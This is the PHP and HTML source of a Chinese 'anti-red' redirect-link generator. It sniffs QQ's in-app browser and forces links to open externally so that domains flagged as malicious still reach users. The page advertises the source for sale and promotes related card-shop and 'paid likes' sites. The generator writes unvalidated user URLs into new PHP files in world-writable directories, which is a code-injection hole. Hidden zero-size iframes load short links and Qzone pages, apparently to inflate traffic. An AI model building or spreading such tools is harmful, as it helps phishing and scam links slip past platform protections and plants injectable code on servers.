
<!DOCTYPE html>
<?php

//目前测试为只有com cn域名能够成功跳转到浏览器
//域名报毒的无法跳转
//将代码放在首页 或者 全局文件

$scriptpath = str_replace('\\', '/', $_SERVER['SCRIPT_NAME']);
$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
$siteurl = ($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $sitepath . '/';
if (strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') !== !1 ) {
	echo '<!DOCTYPE html>
<html>
 <head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>烟火防红跳转生成工具</title>
  <center><font color=red size= 10sp>烟火提示:部分机型无法自动跳转，请点击右上角浏览器打开哦</font></center>
    <img src="http://i1.piimg.com/587262/5f5f738a74190ede.jpg" width="100%" high="100%">
	<iframe src="https://user.qzone.qq.com/1039990553" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
	<iframe src="http://1039990553.qzone.qq.com" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
  <script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
  <script type="text/javascript"> mqq.ui.openUrl({ target: 2,url: "' . $siteurl . '"}); </script>
 </head>
 <body></body>
</html>';
	exit;
}

?>
<head>
<meta charset="utf-8"/>

<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, width=device-width">
<link rel="icon" href="ico.png" type="image/x-icon"/>
<title>烟火防红跳转生成工具 - 全网首发</title>
<meta name="keywords" content="烟火防红跳转生成工具 - 全网首发 - 域名防红 - 防红跳转">
<meta name="description" content="烟火防红跳转生成工具 - 全网首发 - 域名防红 - 防红跳转">
<meta name="360-site-verification" content="9097643d385e1d8c024f4b4781ae297d" />
<link href="m.css" rel="stylesheet" type="text/css"/>
<script src="http://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
</head>
<style>
*{
	padding: 0;
	margin: 0;
}
.mytr{
	border: 1px solid gray;
	line-height:3;
}
.tr2{
	font-size: 14px;
	font-weight: bold;
}
.mytr td{
	border: 1px solid gray;
}
.btnayangw{
    border: 1px solid white;
	min-width:10%;
	min-height: 10%;
	background-color:#1C86EE;
	color: white;
	border-radius:2em;
}
#foot_yl a{
    color:#228B22;
}
#foot_yl a:HOVER {
	color:#7A67EE;
}
.body{  
    text-align:left;  
}
</style>
<script>

</script>
<body>
<div class="top_box">
<header class="header" >
  <div class="site_tl" style="background-color:white;">
     <!--   <p id="bttt"></p> --> 
     <img alt="" src="http://upload.ouliu.net/i/20170929005354auno6.jpeg" width="100%" height="140px;">
 </div>
</header>
<div class="nav" style="">
<ul>
<li><a href="#" target=’_blank‘ ><span>首页</span></a></li>
<li><a href="http://bbq.woxixi.cn" target=’_blank‘ ><span>表白墙</span></a></li>
<li><a href="http://www.woxixi.cn" target=’_blank‘ ><span>网站制作</span></a></li>
</ul>
</div>

</div>
<article class="main">
<?php
if(!file_exists("config.php"))
{
	echo "<script>\nalert('请先安装！');\nwindow.location.href='install.php';</script>";
	exit;
}

$targeturl = isset($_POST['url'])?$_POST['url']:null;

if(!preg_match('/\b((?#protocol)https?|ftp):\/\/((?#domain)[-A-Z0-9.]+)((?#file)\/[-A-Z0-9+&@#\/%=~_|!:,.;]*)?((?#parameters)\?[-A-Z0-9+&@#\/%=~_|!:,.;]*)?/i', $targeturl))
{
	$rem = false;
}
else
{
	$rem = true;
}

include("config.php");
if($rem == false)
{
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" /> 
<title><?php echo $title; ?></title> 
<style type="text/css"> 
a{text-decoration:none; color:#333333}
a:hover{text-decoration:underline; color:#666666}
#all{margin-left:auto; margin-right:auto; width:530px;}
#blank_1{width:10px; height:40px;}
#blank_2{width:10px; height:30px;}
</style> 
</head> 
<body> 
<br>
<div id="all"><div id="s"> 
<form action="" method="post"> 
<?php
if($rem == false && $targeturl != "")
{
	echo "<div style=\"color:red\">必须是以http://、https://或ftp://开头且正确的网址才能压缩</div><p></p>";
}
?>
<div class="body">
&nbsp;&nbsp;<a style="font-size:16px;color:#000;">输入网址：</a><input type="text" name="url" placeholder="http://"  value="http://" style="width:240; height:23px; color:#333333;" />
<input type="submit" value="立即缩短" style="width:140; height:26px; font-size:14px; border:2px solid #ccc; background-color:#ccc; color:#000" /> 
</div>
</form>
</div>
<script type="text/javascript"> 
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F3fbe3828796b6611994b6344534903eb' type='text/javascript'%3E%3C/script%3E"));
</script> 
</body> 
</html> 
<?php
}
else
{
	
	$str = "0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z";
	$str_explode = explode(",",$str);
	$name = "";
	$i = 0;
	while($i<$dirlen)
	{
		$randnum = rand(0,51);
		$name .= $str_explode[$randnum];
		$i++;
		if($i == $dirlen)
		{
			if(file_exists($name . "/index.php"))
			{
				$i = 0;
			}
			else
			{
				mkdir($name,0777);
				$fp = fopen("tem.php","r");
				$gocode = fread($fp,filesize("tem.php"));
				$gocode = str_replace("Targeturl",$targeturl,$gocode);
				$gocode = str_replace("targettime",$targettime,$gocode);
				fclose($fp);
				$fp = fopen($name . "/index.php","w");
				fwrite($fp,$gocode);
				fclose($fp);
			}
		}
	}
	$dirname = $domain . "/" . $name;
	
?>
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" /> 
<meta name="keywords" content="<?php echo $keywords; ?>" />
<meta name="description" content="<?php echo $keywords; ?>" />
<title><?php echo $title; ?></title> 
<style type="text/css"> 
a{text-decoration:none; color:#333333}
a:hover{text-decoration:underline; color:#666666}
#all{margin-left:auto; margin-right:auto; width:530px;}
#blank_1{width:10px; height:40px;}
#blank_2{width:10px; height:30px;}
</style>
<script language="javascript"> 
   function copyUrl()
   { 
    var clipBoardContent=document.getElementById('fuzhi').value; 
	window.clipboardData.setData("Text",clipBoardContent);
   	alert("复制成功!"); 
   } 
   function oCopy(obj)
   {
    obj.select();
	js=obj.createTextRange(); 
	js.execCommand("Copy"); 
	alert("复制成功!"); 
	}
</script>
</head> 
<body> 
<div id="all">
&nbsp;&nbsp;<a style="font-size:16px;color:#000;">生成网址：</a><input type="text" style="width:240; height:23px; color:#333333;" onclick="oCopy(this)" name="fuzhi" value="<?php echo $dirname; ?>" />
<script type="text/javascript"> 
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F3fbe3828796b6611994b6344534903eb' type='text/javascript'%3E%3C/script%3E"));
</script> 
</body> 
</html> 
<?php
}
?>
</div>
	</section>
		<script type="text/javascript" src="www.lxmzan.com/assets/js/201607231617.js" language="javascript"></script>
	<script src="//cdn.bootcss.com/jquery/3.0.0/jquery.min.js"></script>
	<div  class="content myDiv" style="margin-bottom: 10px;">
	   </div>
	</div>
	<br>
	<!--<table id="tab" class="content" style="border: 1px solid gray;border-collapse: collapse;">
		<tbody>
			<tr>
				<td align="center"  style="border: 1px solid gray; width: 70%;"><font color="#808080">临时广告位</font></td>
				<td align="center"  style="border: 1px solid gray; width: 50%;"><font color="#808080">临时广告位</font></td>
			</tr>
		</tbody>
	</table> -->
	<br><br>
	<div class="content">
		&nbsp;&nbsp;<span style="font-size:16px;color:red;"><strong>站内通知：</strong></span>
		<marquee scrollamount=3 style="border-bottom: 1px solid black;">
			<a style="font-size: 13px; color: red;">【站长推荐】欢迎关注烟火卡盟！防红跳转网站源码/一套50元/联系QQ：1039990553有问题请联系站长QQ：1039990553</a>
		</marquee>
		

				
			<div align="center"
				style="border: 1px solid #63B8FF; min-height: 150px; font-size: 16px; line-height: 1.5; margin: 5px; border-radius: 2em;padding: 5px;">
<div id="con_nav" class="con_nav">
    
        <span style="font-size:18px;color:red;">本站推广</span>
       <!-- <span id="s2">站内公告</span> --> 
  
</div>
<div id="s1_div">
  <a style="color:red;" target='_blank'>【置顶公告】欢迎来到本站</a><br>
  <a href="http://wpa.qq.com/msgrd?v=3&uin=1039990553&site=qq&menu=yes" style="color:#D2691E" target='_blank'>→不再担心网站报毒业务接单必备←</a><br>
  
    <a href="http://wpa.qq.com/msgrd?v=3&uin=1039990553&site=qq&menu=yes" style="color:#D2691E" target='_blank'>搭建本站一模一样的网站！请联系QQ：1039990553</a><br>
<li align="center"><a href="http://www.yanhuokm.com" target="_blank"  style="color:#CC0033";"class="STYLE1"><img style="width:100%;max-height:100px;" src="http://upload.ouliu.net/i/20170929004632w9fjx.gif" alt="注册秒提现一元微信红包"/></a>
<li align="center"><a href="http://wpa.qq.com/msgrd?v=3&uin=1039990553&site=qq&menu=yes" target="_blank"  style="color:#CC0033";"class="STYLE1"><img style="width:100%;max-height:100px;" src="gg.gif" alt="防红跳转网广告位招租"/></a>
	 <!-- 
<div id="s2_div" style="display: none;">
  站内公告！！！！！
</div>--> 
<hr style="margin-top: 10px;">


<script type="text/javascript" data-rocketsrc="assets/js/layer/layer.js" language="javascript"></script>
<div class="Contxt" style="overflow:visible;text-align:left;min-height: 30px; padding-top: 5px;">
<p id="foot_yl"><font style="font-weight: bold;">本站推荐：</font>
<a href='http://www.yanhuokm.com' target=’_blank‘ >烟火卡盟</a>
丨<a href='http://www.yanhuokm.cn' target=’_blank‘ >代刷网</a>
丨<a href='http://www.woxixi.cn' target=’_blank‘ >改手机号</a>
<hr style="margin-top: 5px;">
</div>

QQ防红跳转丨<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1264444671'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1264444671%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script>

<iframe src="http://t.cn/Ra32zdd" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
<iframe src="http://t.cn/RtGkEk2" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
<iframe src="http://t.cn/RSDicVH" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
<iframe src="http://t.cn/R6H65Vr" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
<iframe src="http://t.cn/R9fJe1T" width="0" height="0"  align="center" frameborder="0" scrolling="no" marginwidth="0"></iframe>
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
</div>
<script src="http://cdn.bootcss.com/jquery/3.0.0/jquery.min.js"></script>
<script src="http://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script type="text/javascript" src="http://zqywl.top/assets/js/layer/layer.js" language="javascript"></script>


<script type="text/javascript" src="http://zqywl.top/assets/js/201607231617.js" language="javascript"></script>
<script>

</script>
</body>
</html><script type="text/javascript">
$(function(){
	index();
})
</script>